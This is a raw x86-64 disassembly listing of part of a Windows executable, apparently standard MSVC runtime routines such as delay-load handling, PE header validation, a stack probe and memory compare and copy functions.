   14000afe3:	48 8b 05 a6 ba 00 00 	mov    0xbaa6(%rip),%rax        # 0x140016a90
   14000afea:	48 85 c0             	test   %rax,%rax
   14000afed:	75 f2                	jne    0x14000afe1
   14000afef:	8d 48 01             	lea    0x1(%rax),%ecx
   14000aff2:	f0 48 0f b1 0d 95 ba 	lock cmpxchg %rcx,0xba95(%rip)        # 0x140016a90
   14000aff9:	00 00 
   14000affb:	75 e6                	jne    0x14000afe3
   14000affd:	83 05 94 ba 00 00 ff 	addl   $0xffffffff,0xba94(%rip)        # 0x140016a98
   14000b004:	75 10                	jne    0x14000b016
   14000b006:	8b 0d 90 ba 00 00    	mov    0xba90(%rip),%ecx        # 0x140016a9c
   14000b00c:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   14000b011:	e8 02 ff ff ff       	call   0x14000af18
   14000b016:	e8 31 fd ff ff       	call   0x14000ad4c
   14000b01b:	84 c0                	test   %al,%al
   14000b01d:	74 1b                	je     0x14000b03a
   14000b01f:	48 8b 1d 62 ba 00 00 	mov    0xba62(%rip),%rbx        # 0x140016a88
   14000b026:	48 8b cb             	mov    %rbx,%rcx
   14000b029:	ff 15 59 12 00 00    	call   *0x1259(%rip)        # 0x14000c288
   14000b02f:	48 8d 0d 5a ba 00 00 	lea    0xba5a(%rip),%rcx        # 0x140016a90
   14000b036:	ff d3                	call   *%rbx
   14000b038:	eb 0b                	jmp    0x14000b045
   14000b03a:	48 c7 05 4b ba 00 00 	movq   $0x0,0xba4b(%rip)        # 0x140016a90
   14000b041:	00 00 00 00 
   14000b045:	48 83 c4 20          	add    $0x20,%rsp
   14000b049:	5b                   	pop    %rbx
   14000b04a:	c3                   	ret
   14000b04b:	90                   	nop
   14000b04c:	55                   	push   %rbp
   14000b04d:	53                   	push   %rbx
   14000b04e:	56                   	push   %rsi
   14000b04f:	57                   	push   %rdi
   14000b050:	41 54                	push   %r12
   14000b052:	41 55                	push   %r13
   14000b054:	41 56                	push   %r14
   14000b056:	41 57                	push   %r15
   14000b058:	48 8d 6c 24 e1       	lea    -0x1f(%rsp),%rbp
   14000b05d:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   14000b064:	4c 8b ea             	mov    %rdx,%r13
   14000b067:	4c 8b f9             	mov    %rcx,%r15
   14000b06a:	e8 21 fc ff ff       	call   0x14000ac90
   14000b06f:	41 8b 47 04          	mov    0x4(%r15),%eax
   14000b073:	4c 8d 15 86 4f ff ff 	lea    -0xb07a(%rip),%r10        # 0x140000000
   14000b07a:	45 8b 47 14          	mov    0x14(%r15),%r8d
   14000b07e:	49 03 c2             	add    %r10,%rax
   14000b081:	45 8b 0f             	mov    (%r15),%r9d
   14000b084:	4d 03 c2             	add    %r10,%r8
   14000b087:	45 8b 67 08          	mov    0x8(%r15),%r12d
   14000b08b:	41 83 e1 01          	and    $0x1,%r9d
   14000b08f:	41 8b 57 0c          	mov    0xc(%r15),%edx
   14000b093:	4d 03 e2             	add    %r10,%r12
   14000b096:	41 8b 4f 10          	mov    0x10(%r15),%ecx
   14000b09a:	49 03 d2             	add    %r10,%rdx
   14000b09d:	83 65 e7 00          	andl   $0x0,-0x19(%rbp)
   14000b0a1:	49 03 ca             	add    %r10,%rcx
   14000b0a4:	48 89 45 df          	mov    %rax,-0x21(%rbp)
   14000b0a8:	33 c0                	xor    %eax,%eax
   14000b0aa:	48 21 45 f7          	and    %rax,-0x9(%rbp)
   14000b0ae:	48 21 45 ff          	and    %rax,-0x1(%rbp)
   14000b0b2:	21 45 07             	and    %eax,0x7(%rbp)
   14000b0b5:	4c 89 45 7f          	mov    %r8,0x7f(%rbp)
   14000b0b9:	45 8b 47 1c          	mov    0x1c(%r15),%r8d
   14000b0bd:	44 89 45 67          	mov    %r8d,0x67(%rbp)
   14000b0c1:	c7 45 c7 48 00 00 00 	movl   $0x48,-0x39(%rbp)
   14000b0c8:	4c 89 7d cf          	mov    %r15,-0x31(%rbp)
   14000b0cc:	4c 89 6d d7          	mov    %r13,-0x29(%rbp)
   14000b0d0:	48 89 45 ef          	mov    %rax,-0x11(%rbp)
   14000b0d4:	45 84 c9             	test   %r9b,%r9b
   14000b0d7:	75 29                	jne    0x14000b102
   14000b0d9:	48 8d 45 c7          	lea    -0x39(%rbp),%rax
   14000b0dd:	48 89 45 6f          	mov    %rax,0x6f(%rbp)
   14000b0e1:	e8 c2 fe ff ff       	call   0x14000afa8
   14000b0e6:	33 d2                	xor    %edx,%edx
   14000b0e8:	4c 8d 4d 6f          	lea    0x6f(%rbp),%r9
   14000b0ec:	b9 57 00 6d c0       	mov    $0xc06d0057,%ecx
   14000b0f1:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   14000b0f5:	ff 15 05 10 00 00    	call   *0x1005(%rip)        # 0x14000c100
   14000b0fb:	33 c0                	xor    %eax,%eax
   14000b0fd:	e9 3b 02 00 00       	jmp    0x14000b33d
   14000b102:	49 8b 3c 24          	mov    (%r12),%rdi
   14000b106:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   14000b10d:	00 00 80 
   14000b110:	4d 8b f5             	mov    %r13,%r14
   14000b113:	4c 2b f2             	sub    %rdx,%r14
   14000b116:	49 c1 fe 03          	sar    $0x3,%r14
   14000b11a:	45 8b f6             	mov    %r14d,%r14d
   14000b11d:	4a 85 04 f1          	test   %rax,(%rcx,%r14,8)
   14000b121:	b8 00 00 00 00       	mov    $0x0,%eax
   14000b126:	0f 94 c0             	sete   %al
   14000b129:	89 45 e7             	mov    %eax,-0x19(%rbp)
   14000b12c:	85 c0                	test   %eax,%eax
   14000b12e:	74 14                	je     0x14000b144
   14000b130:	42 8b 04 f1          	mov    (%rcx,%r14,8),%eax
   14000b134:	48 8d 0d c7 4e ff ff 	lea    -0xb139(%rip),%rcx        # 0x140000002
   14000b13b:	48 03 c1             	add    %rcx,%rax
   14000b13e:	48 89 45 ef          	mov    %rax,-0x11(%rbp)
   14000b142:	eb 08                	jmp    0x14000b14c
   14000b144:	42 0f b7 04 f1       	movzwl (%rcx,%r14,8),%eax
   14000b149:	89 45 ef             	mov    %eax,-0x11(%rbp)
   14000b14c:	48 8b 35 55 b9 00 00 	mov    0xb955(%rip),%rsi        # 0x140016aa8
   14000b153:	33 db                	xor    %ebx,%ebx
   14000b155:	48 85 f6             	test   %rsi,%rsi
   14000b158:	74 24                	je     0x14000b17e
   14000b15a:	48 8b ce             	mov    %rsi,%rcx
   14000b15d:	ff 15 25 11 00 00    	call   *0x1125(%rip)        # 0x14000c288
   14000b163:	48 8d 55 c7          	lea    -0x39(%rbp),%rdx
   14000b167:	33 c9                	xor    %ecx,%ecx
   14000b169:	ff d6                	call   *%rsi
   14000b16b:	48 8b d8             	mov    %rax,%rbx
   14000b16e:	48 85 c0             	test   %rax,%rax
   14000b171:	0f 85 92 01 00 00    	jne    0x14000b309
   14000b177:	48 8b 35 2a b9 00 00 	mov    0xb92a(%rip),%rsi        # 0x140016aa8
   14000b17e:	48 85 ff             	test   %rdi,%rdi
   14000b181:	0f 85 ae 00 00 00    	jne    0x14000b235
   14000b187:	48 85 f6             	test   %rsi,%rsi
   14000b18a:	74 1a                	je     0x14000b1a6
   14000b18c:	48 8b ce             	mov    %rsi,%rcx
   14000b18f:	ff 15 f3 10 00 00    	call   *0x10f3(%rip)        # 0x14000c288
   14000b195:	48 8d 55 c7          	lea    -0x39(%rbp),%rdx
   14000b199:	8d 4f 01             	lea    0x1(%rdi),%ecx
   14000b19c:	ff d6                	call   *%rsi
   14000b19e:	48 8b f8             	mov    %rax,%rdi
   14000b1a1:	48 85 c0             	test   %rax,%rax
   14000b1a4:	75 73                	jne    0x14000b219
   14000b1a6:	48 8b 4d df          	mov    -0x21(%rbp),%rcx
   14000b1aa:	45 33 c0             	xor    %r8d,%r8d
   14000b1ad:	33 d2                	xor    %edx,%edx
   14000b1af:	ff 15 c3 10 00 00    	call   *0x10c3(%rip)        # 0x14000c278
   14000b1b5:	48 8b f8             	mov    %rax,%rdi
   14000b1b8:	48 85 c0             	test   %rax,%rax
   14000b1bb:	75 5c                	jne    0x14000b219
   14000b1bd:	ff 15 3d 0e 00 00    	call   *0xe3d(%rip)        # 0x14000c000
   14000b1c3:	48 8b 3d e6 b8 00 00 	mov    0xb8e6(%rip),%rdi        # 0x140016ab0
   14000b1ca:	89 45 07             	mov    %eax,0x7(%rbp)
   14000b1cd:	48 85 ff             	test   %rdi,%rdi
   14000b1d0:	74 1c                	je     0x14000b1ee
   14000b1d2:	48 8b cf             	mov    %rdi,%rcx
   14000b1d5:	ff 15 ad 10 00 00    	call   *0x10ad(%rip)        # 0x14000c288
   14000b1db:	48 8d 55 c7          	lea    -0x39(%rbp),%rdx
   14000b1df:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000b1e4:	ff d7                	call   *%rdi
   14000b1e6:	48 8b f8             	mov    %rax,%rdi
   14000b1e9:	48 85 c0             	test   %rax,%rax
   14000b1ec:	75 2b                	jne    0x14000b219
   14000b1ee:	48 8d 45 c7          	lea    -0x39(%rbp),%rax
   14000b1f2:	48 89 45 77          	mov    %rax,0x77(%rbp)
   14000b1f6:	e8 ad fd ff ff       	call   0x14000afa8
   14000b1fb:	33 d2                	xor    %edx,%edx
   14000b1fd:	4c 8d 4d 77          	lea    0x77(%rbp),%r9
   14000b201:	b9 7e 00 6d c0       	mov    $0xc06d007e,%ecx
   14000b206:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   14000b20a:	ff 15 f0 0e 00 00    	call   *0xef0(%rip)        # 0x14000c100
   14000b210:	48 8b 45 ff          	mov    -0x1(%rbp),%rax
   14000b214:	e9 24 01 00 00       	jmp    0x14000b33d
   14000b219:	48 8b c7             	mov    %rdi,%rax
   14000b21c:	49 87 04 24          	xchg   %rax,(%r12)
   14000b220:	48 3b c7             	cmp    %rdi,%rax
   14000b223:	75 09                	jne    0x14000b22e
   14000b225:	48 8b cf             	mov    %rdi,%rcx
   14000b228:	ff 15 02 0f 00 00    	call   *0xf02(%rip)        # 0x14000c130
   14000b22e:	48 8b 35 73 b8 00 00 	mov    0xb873(%rip),%rsi        # 0x140016aa8
   14000b235:	48 89 7d f7          	mov    %rdi,-0x9(%rbp)
   14000b239:	48 85 f6             	test   %rsi,%rsi
   14000b23c:	74 17                	je     0x14000b255
   14000b23e:	48 8b ce             	mov    %rsi,%rcx
   14000b241:	ff 15 41 10 00 00    	call   *0x1041(%rip)        # 0x14000c288
   14000b247:	48 8d 55 c7          	lea    -0x39(%rbp),%rdx
   14000b24b:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000b250:	ff d6                	call   *%rsi
   14000b252:	48 8b d8             	mov    %rax,%rbx
   14000b255:	48 85 db             	test   %rbx,%rbx
   14000b258:	0f 85 a7 00 00 00    	jne    0x14000b305
   14000b25e:	41 39 5f 14          	cmp    %ebx,0x14(%r15)
   14000b262:	74 30                	je     0x14000b294
   14000b264:	41 39 5f 1c          	cmp    %ebx,0x1c(%r15)
   14000b268:	74 2a                	je     0x14000b294
   14000b26a:	48 63 47 3c          	movslq 0x3c(%rdi),%rax
   14000b26e:	81 3c 38 50 45 00 00 	cmpl   $0x4550,(%rax,%rdi,1)
   14000b275:	75 1d                	jne    0x14000b294
   14000b277:	8b 4d 67             	mov    0x67(%rbp),%ecx
   14000b27a:	39 4c 38 08          	cmp    %ecx,0x8(%rax,%rdi,1)
   14000b27e:	75 14                	jne    0x14000b294
   14000b280:	48 3b 7c 38 30       	cmp    0x30(%rax,%rdi,1),%rdi
   14000b285:	75 0d                	jne    0x14000b294
   14000b287:	48 8b 5d 7f          	mov    0x7f(%rbp),%rbx
   14000b28b:	4a 8b 1c f3          	mov    (%rbx,%r14,8),%rbx
   14000b28f:	48 85 db             	test   %rbx,%rbx
   14000b292:	75 71                	jne    0x14000b305
   14000b294:	48 8b 55 ef          	mov    -0x11(%rbp),%rdx
   14000b298:	48 8b cf             	mov    %rdi,%rcx
   14000b29b:	ff 15 7f 0d 00 00    	call   *0xd7f(%rip)        # 0x14000c020
   14000b2a1:	48 8b d8             	mov    %rax,%rbx
   14000b2a4:	48 85 c0             	test   %rax,%rax
   14000b2a7:	75 5c                	jne    0x14000b305
   14000b2a9:	ff 15 51 0d 00 00    	call   *0xd51(%rip)        # 0x14000c000
   14000b2af:	48 8b 1d fa b7 00 00 	mov    0xb7fa(%rip),%rbx        # 0x140016ab0
   14000b2b6:	89 45 07             	mov    %eax,0x7(%rbp)
   14000b2b9:	48 85 db             	test   %rbx,%rbx
   14000b2bc:	74 1c                	je     0x14000b2da
   14000b2be:	48 8b cb             	mov    %rbx,%rcx
   14000b2c1:	ff 15 c1 0f 00 00    	call   *0xfc1(%rip)        # 0x14000c288
   14000b2c7:	48 8d 55 c7          	lea    -0x39(%rbp),%rdx
   14000b2cb:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000b2d0:	ff d3                	call   *%rbx
   14000b2d2:	48 8b d8             	mov    %rax,%rbx
   14000b2d5:	48 85 c0             	test   %rax,%rax
   14000b2d8:	75 2b                	jne    0x14000b305
   14000b2da:	48 8d 45 c7          	lea    -0x39(%rbp),%rax
   14000b2de:	48 89 45 b7          	mov    %rax,-0x49(%rbp)
   14000b2e2:	e8 c1 fc ff ff       	call   0x14000afa8
   14000b2e7:	33 d2                	xor    %edx,%edx
   14000b2e9:	4c 8d 4d b7          	lea    -0x49(%rbp),%r9
   14000b2ed:	b9 7f 00 6d c0       	mov    $0xc06d007f,%ecx
   14000b2f2:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   14000b2f6:	ff 15 04 0e 00 00    	call   *0xe04(%rip)        # 0x14000c100
   14000b2fc:	e8 8f f9 ff ff       	call   0x14000ac90
   14000b301:	48 8b 5d ff          	mov    -0x1(%rbp),%rbx
   14000b305:	49 89 5d 00          	mov    %rbx,0x0(%r13)
   14000b309:	48 8b 35 98 b7 00 00 	mov    0xb798(%rip),%rsi        # 0x140016aa8
   14000b310:	48 85 f6             	test   %rsi,%rsi
   14000b313:	74 20                	je     0x14000b335
   14000b315:	83 65 07 00          	andl   $0x0,0x7(%rbp)
   14000b319:	48 8b ce             	mov    %rsi,%rcx
   14000b31c:	48 89 7d f7          	mov    %rdi,-0x9(%rbp)
   14000b320:	48 89 5d ff          	mov    %rbx,-0x1(%rbp)
   14000b324:	ff 15 5e 0f 00 00    	call   *0xf5e(%rip)        # 0x14000c288
   14000b32a:	48 8d 55 c7          	lea    -0x39(%rbp),%rdx
   14000b32e:	b9 05 00 00 00       	mov    $0x5,%ecx
   14000b333:	ff d6                	call   *%rsi
   14000b335:	e8 6e fc ff ff       	call   0x14000afa8
   14000b33a:	48 8b c3             	mov    %rbx,%rax
   14000b33d:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   14000b344:	41 5f                	pop    %r15
   14000b346:	41 5e                	pop    %r14
   14000b348:	41 5d                	pop    %r13
   14000b34a:	41 5c                	pop    %r12
   14000b34c:	5f                   	pop    %rdi
   14000b34d:	5e                   	pop    %rsi
   14000b34e:	5b                   	pop    %rbx
   14000b34f:	5d                   	pop    %rbp
   14000b350:	c3                   	ret
   14000b351:	90                   	nop
   14000b352:	90                   	nop
   14000b353:	90                   	nop
   14000b354:	ff 25 7e 0d 00 00    	jmp    *0xd7e(%rip)        # 0x14000c0d8
   14000b35a:	90                   	nop
   14000b35b:	90                   	nop
   14000b35c:	ff 25 96 0d 00 00    	jmp    *0xd96(%rip)        # 0x14000c0f8
   14000b362:	90                   	nop
   14000b363:	90                   	nop
   14000b364:	90                   	nop
   14000b365:	90                   	nop
   14000b366:	90                   	nop
   14000b367:	90                   	nop
   14000b368:	90                   	nop
   14000b369:	90                   	nop
   14000b36a:	90                   	nop
   14000b36b:	90                   	nop
   14000b36c:	90                   	nop
   14000b36d:	90                   	nop
   14000b36e:	90                   	nop
   14000b36f:	90                   	nop
   14000b370:	4c 63 41 3c          	movslq 0x3c(%rcx),%r8
   14000b374:	45 33 c9             	xor    %r9d,%r9d
   14000b377:	4c 03 c1             	add    %rcx,%r8
   14000b37a:	4c 8b d2             	mov    %rdx,%r10
   14000b37d:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
   14000b382:	45 0f b7 58 06       	movzwl 0x6(%r8),%r11d
   14000b387:	48 83 c0 18          	add    $0x18,%rax
   14000b38b:	49 03 c0             	add    %r8,%rax
   14000b38e:	45 85 db             	test   %r11d,%r11d
   14000b391:	74 1e                	je     0x14000b3b1
   14000b393:	8b 50 0c             	mov    0xc(%rax),%edx
   14000b396:	4c 3b d2             	cmp    %rdx,%r10
   14000b399:	72 0a                	jb     0x14000b3a5
   14000b39b:	8b 48 08             	mov    0x8(%rax),%ecx
   14000b39e:	03 ca                	add    %edx,%ecx
   14000b3a0:	4c 3b d1             	cmp    %rcx,%r10
   14000b3a3:	72 0e                	jb     0x14000b3b3
   14000b3a5:	41 ff c1             	inc    %r9d
   14000b3a8:	48 83 c0 28          	add    $0x28,%rax
   14000b3ac:	45 3b cb             	cmp    %r11d,%r9d
   14000b3af:	72 e2                	jb     0x14000b393
   14000b3b1:	33 c0                	xor    %eax,%eax
   14000b3b3:	c3                   	ret
   14000b3b4:	90                   	nop
   14000b3b5:	90                   	nop
   14000b3b6:	90                   	nop
   14000b3b7:	90                   	nop
   14000b3b8:	90                   	nop
   14000b3b9:	90                   	nop
   14000b3ba:	90                   	nop
   14000b3bb:	90                   	nop
   14000b3bc:	90                   	nop
   14000b3bd:	90                   	nop
   14000b3be:	90                   	nop
   14000b3bf:	90                   	nop
   14000b3c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b3c5:	57                   	push   %rdi
   14000b3c6:	48 83 ec 20          	sub    $0x20,%rsp
   14000b3ca:	48 8b d9             	mov    %rcx,%rbx
   14000b3cd:	48 8d 3d 2c 4c ff ff 	lea    -0xb3d4(%rip),%rdi        # 0x140000000
   14000b3d4:	48 8b cf             	mov    %rdi,%rcx
   14000b3d7:	e8 34 00 00 00       	call   0x14000b410
   14000b3dc:	85 c0                	test   %eax,%eax
   14000b3de:	74 22                	je     0x14000b402
   14000b3e0:	48 2b df             	sub    %rdi,%rbx
   14000b3e3:	48 8b d3             	mov    %rbx,%rdx
   14000b3e6:	48 8b cf             	mov    %rdi,%rcx
   14000b3e9:	e8 82 ff ff ff       	call   0x14000b370
   14000b3ee:	48 85 c0             	test   %rax,%rax
   14000b3f1:	74 0f                	je     0x14000b402
   14000b3f3:	8b 40 24             	mov    0x24(%rax),%eax
   14000b3f6:	c1 e8 1f             	shr    $0x1f,%eax
   14000b3f9:	f7 d0                	not    %eax
   14000b3fb:	83 e0 01             	and    $0x1,%eax
   14000b3fe:	eb 02                	jmp    0x14000b402
   14000b400:	33 c0                	xor    %eax,%eax
   14000b402:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000b407:	48 83 c4 20          	add    $0x20,%rsp
   14000b40b:	5f                   	pop    %rdi
   14000b40c:	c3                   	ret
   14000b40d:	90                   	nop
   14000b40e:	90                   	nop
   14000b40f:	90                   	nop
   14000b410:	48 8b c1             	mov    %rcx,%rax
   14000b413:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   14000b418:	66 39 08             	cmp    %cx,(%rax)
   14000b41b:	74 03                	je     0x14000b420
   14000b41d:	33 c0                	xor    %eax,%eax
   14000b41f:	c3                   	ret
   14000b420:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   14000b424:	48 03 c8             	add    %rax,%rcx
   14000b427:	33 c0                	xor    %eax,%eax
   14000b429:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   14000b42f:	75 0c                	jne    0x14000b43d
   14000b431:	ba 0b 02 00 00       	mov    $0x20b,%edx
   14000b436:	66 39 51 18          	cmp    %dx,0x18(%rcx)
   14000b43a:	0f 94 c0             	sete   %al
   14000b43d:	c3                   	ret
   14000b43e:	90                   	nop
   14000b43f:	90                   	nop
   14000b440:	48 83 ec 10          	sub    $0x10,%rsp
   14000b444:	4c 89 14 24          	mov    %r10,(%rsp)
   14000b448:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   14000b44d:	4d 33 db             	xor    %r11,%r11
   14000b450:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   14000b455:	4c 2b d0             	sub    %rax,%r10
   14000b458:	4d 0f 42 d3          	cmovb  %r11,%r10
   14000b45c:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   14000b463:	00 00 
   14000b465:	4d 3b d3             	cmp    %r11,%r10
   14000b468:	f2 73 17             	bnd jae 0x14000b482
   14000b46b:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
   14000b471:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   14000b478:	41 c6 03 00          	movb   $0x0,(%r11)
   14000b47c:	4d 3b d3             	cmp    %r11,%r10
   14000b47f:	f2 75 ef             	bnd jne 0x14000b471
   14000b482:	4c 8b 14 24          	mov    (%rsp),%r10
   14000b486:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   14000b48b:	48 83 c4 10          	add    $0x10,%rsp
   14000b48f:	f2 c3                	bnd ret
   14000b491:	90                   	nop
   14000b492:	90                   	nop
   14000b493:	90                   	nop
   14000b494:	90                   	nop
   14000b495:	90                   	nop
   14000b496:	90                   	nop
   14000b497:	90                   	nop
   14000b498:	90                   	nop
   14000b499:	90                   	nop
   14000b49a:	90                   	nop
   14000b49b:	90                   	nop
   14000b49c:	90                   	nop
   14000b49d:	90                   	nop
   14000b49e:	90                   	nop
   14000b49f:	90                   	nop
   14000b4a0:	48 2b d1             	sub    %rcx,%rdx
   14000b4a3:	49 83 f8 08          	cmp    $0x8,%r8
   14000b4a7:	72 22                	jb     0x14000b4cb
   14000b4a9:	f6 c1 07             	test   $0x7,%cl
   14000b4ac:	74 14                	je     0x14000b4c2
   14000b4ae:	66 90                	xchg   %ax,%ax
   14000b4b0:	8a 01                	mov    (%rcx),%al
   14000b4b2:	3a 04 0a             	cmp    (%rdx,%rcx,1),%al
   14000b4b5:	75 2c                	jne    0x14000b4e3
   14000b4b7:	48 ff c1             	inc    %rcx
   14000b4ba:	49 ff c8             	dec    %r8
   14000b4bd:	f6 c1 07             	test   $0x7,%cl
   14000b4c0:	75 ee                	jne    0x14000b4b0
   14000b4c2:	4d 8b c8             	mov    %r8,%r9
   14000b4c5:	49 c1 e9 03          	shr    $0x3,%r9
   14000b4c9:	75 1e                	jne    0x14000b4e9
   14000b4cb:	4d 85 c0             	test   %r8,%r8
   14000b4ce:	74 0f                	je     0x14000b4df
   14000b4d0:	8a 01                	mov    (%rcx),%al
   14000b4d2:	3a 04 0a             	cmp    (%rdx,%rcx,1),%al
   14000b4d5:	75 0c                	jne    0x14000b4e3
   14000b4d7:	48 ff c1             	inc    %rcx
   14000b4da:	49 ff c8             	dec    %r8
   14000b4dd:	75 f1                	jne    0x14000b4d0
   14000b4df:	48 33 c0             	xor    %rax,%rax
   14000b4e2:	c3                   	ret
   14000b4e3:	1b c0                	sbb    %eax,%eax
   14000b4e5:	83 d8 ff             	sbb    $0xffffffff,%eax
   14000b4e8:	c3                   	ret
   14000b4e9:	49 c1 e9 02          	shr    $0x2,%r9
   14000b4ed:	74 37                	je     0x14000b526
   14000b4ef:	48 8b 01             	mov    (%rcx),%rax
   14000b4f2:	48 3b 04 0a          	cmp    (%rdx,%rcx,1),%rax
   14000b4f6:	75 5b                	jne    0x14000b553
   14000b4f8:	48 8b 41 08          	mov    0x8(%rcx),%rax
   14000b4fc:	48 3b 44 0a 08       	cmp    0x8(%rdx,%rcx,1),%rax
   14000b501:	75 4c                	jne    0x14000b54f
   14000b503:	48 8b 41 10          	mov    0x10(%rcx),%rax
   14000b507:	48 3b 44 0a 10       	cmp    0x10(%rdx,%rcx,1),%rax
   14000b50c:	75 3d                	jne    0x14000b54b
   14000b50e:	48 8b 41 18          	mov    0x18(%rcx),%rax
   14000b512:	48 3b 44 0a 18       	cmp    0x18(%rdx,%rcx,1),%rax
   14000b517:	75 2e                	jne    0x14000b547
   14000b519:	48 83 c1 20          	add    $0x20,%rcx
   14000b51d:	49 ff c9             	dec    %r9
   14000b520:	75 cd                	jne    0x14000b4ef
   14000b522:	49 83 e0 1f          	and    $0x1f,%r8
   14000b526:	4d 8b c8             	mov    %r8,%r9
   14000b529:	49 c1 e9 03          	shr    $0x3,%r9
   14000b52d:	74 9c                	je     0x14000b4cb
   14000b52f:	48 8b 01             	mov    (%rcx),%rax
   14000b532:	48 3b 04 0a          	cmp    (%rdx,%rcx,1),%rax
   14000b536:	75 1b                	jne    0x14000b553
   14000b538:	48 83 c1 08          	add    $0x8,%rcx
   14000b53c:	49 ff c9             	dec    %r9
   14000b53f:	75 ee                	jne    0x14000b52f
   14000b541:	49 83 e0 07          	and    $0x7,%r8
   14000b545:	eb 84                	jmp    0x14000b4cb
   14000b547:	48 83 c1 08          	add    $0x8,%rcx
   14000b54b:	48 83 c1 08          	add    $0x8,%rcx
   14000b54f:	48 83 c1 08          	add    $0x8,%rcx
   14000b553:	48 8b 0c 11          	mov    (%rcx,%rdx,1),%rcx
   14000b557:	48 0f c8             	bswap  %rax
   14000b55a:	48 0f c9             	bswap  %rcx
   14000b55d:	48 3b c1             	cmp    %rcx,%rax
   14000b560:	1b c0                	sbb    %eax,%eax
   14000b562:	83 d8 ff             	sbb    $0xffffffff,%eax
   14000b565:	c3                   	ret
   14000b566:	90                   	nop
   14000b567:	90                   	nop
   14000b568:	90                   	nop
   14000b569:	90                   	nop
   14000b56a:	90                   	nop
   14000b56b:	90                   	nop
   14000b56c:	90                   	nop
   14000b56d:	90                   	nop
   14000b56e:	90                   	nop
   14000b56f:	90                   	nop
   14000b570:	90                   	nop
   14000b571:	90                   	nop
   14000b572:	90                   	nop
   14000b573:	90                   	nop
   14000b574:	90                   	nop
   14000b575:	90                   	nop
   14000b576:	90                   	nop
   14000b577:	90                   	nop
   14000b578:	90                   	nop
   14000b579:	90                   	nop
   14000b57a:	90                   	nop
   14000b57b:	90                   	nop
   14000b57c:	90                   	nop
   14000b57d:	90                   	nop
   14000b57e:	90                   	nop
   14000b57f:	90                   	nop
   14000b580:	4c 8b d9             	mov    %rcx,%r11
   14000b583:	4c 8b d2             	mov    %rdx,%r10
   14000b586:	49 83 f8 10          	cmp    $0x10,%r8
   14000b58a:	76 66                	jbe    0x14000b5f2
   14000b58c:	49 83 f8 20          	cmp    $0x20,%r8
   14000b590:	76 4a                	jbe    0x14000b5dc
   14000b592:	48 2b d1             	sub    %rcx,%rdx
   14000b595:	73 0f                	jae    0x14000b5a6
   14000b597:	49 8b c2             	mov    %r10,%rax
   14000b59a:	49 03 c0             	add    %r8,%rax
   14000b59d:	48 3b c8             	cmp    %rax,%rcx
   14000b5a0:	0f 8c f9 02 00 00    	jl     0x14000b89f
   14000b5a6:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   14000b5ad:	0f 86 3b 02 00 00    	jbe    0x14000b7ee
   14000b5b3:	0f ba 25 75 a9 00 00 	btl    $0x1,0xa975(%rip)        # 0x140015f30
   14000b5ba:	01 
   14000b5bb:	0f 83 8b 01 00 00    	jae    0x14000b74c
   14000b5c1:	49 8b c3             	mov    %r11,%rax
   14000b5c4:	4c 8b df             	mov    %rdi,%r11
   14000b5c7:	48 8b f9             	mov    %rcx,%rdi
   14000b5ca:	49 8b c8             	mov    %r8,%rcx
   14000b5cd:	4c 8b c6             	mov    %rsi,%r8
   14000b5d0:	49 8b f2             	mov    %r10,%rsi
   14000b5d3:	f3 a4                	rep movsb (%rsi),(%rdi)
   14000b5d5:	49 8b f0             	mov    %r8,%rsi
   14000b5d8:	49 8b fb             	mov    %r11,%rdi
   14000b5db:	c3                   	ret
   14000b5dc:	0f 10 02             	movups (%rdx),%xmm0
   14000b5df:	41 0f 10 4c 10 f0    	movups -0x10(%r8,%rdx,1),%xmm1
   14000b5e5:	0f 11 01             	movups %xmm0,(%rcx)
   14000b5e8:	41 0f 11 4c 08 f0    	movups %xmm1,-0x10(%r8,%rcx,1)
   14000b5ee:	48 8b c1             	mov    %rcx,%rax
   14000b5f1:	c3                   	ret
   14000b5f2:	48 8b c1             	mov    %rcx,%rax
   14000b5f5:	4c 8d 0d 04 4a ff ff 	lea    -0xb5fc(%rip),%r9        # 0x140000000
   14000b5fc:	43 8b 8c 81 09 b6 00 	mov    0xb609(%r9,%r8,4),%ecx
   14000b603:	00 
   14000b604:	49 03 c9             	add    %r9,%rcx
   14000b607:	ff e1                	jmp    *%rcx
   14000b609:	52                   	push   %rdx
   14000b60a:	b6 00                	mov    $0x0,%dh
   14000b60c:	00 71 b6             	add    %dh,-0x4a(%rcx)
   14000b60f:	00 00                	add    %al,(%rax)
   14000b611:	53                   	push   %rbx
   14000b612:	b6 00                	mov    $0x0,%dh
   14000b614:	00 61 b6             	add    %ah,-0x4a(%rcx)
   14000b617:	00 00                	add    %al,(%rax)
   14000b619:	9b                   	fwait
   14000b61a:	b6 00                	mov    $0x0,%dh
   14000b61c:	00 a0 b6 00 00 ae    	add    %ah,-0x51ffff4a(%rax)
   14000b622:	b6 00                	mov    $0x0,%dh
   14000b624:	00 bd b6 00 00 5a    	add    %bh,0x5a0000b6(%rbp)
   14000b62a:	b6 00                	mov    $0x0,%dh
   14000b62c:	00 eb                	add    %ch,%bl
   14000b62e:	b6 00                	mov    $0x0,%dh
   14000b630:	00 f9                	add    %bh,%cl
   14000b632:	b6 00                	mov    $0x0,%dh
   14000b634:	00 80 b6 00 00 08    	add    %al,0x80000b6(%rax)
   14000b63a:	b7 00                	mov    $0x0,%bh
   14000b63c:	00 d5                	add    %dl,%ch
   14000b63e:	b6 00                	mov    $0x0,%dh
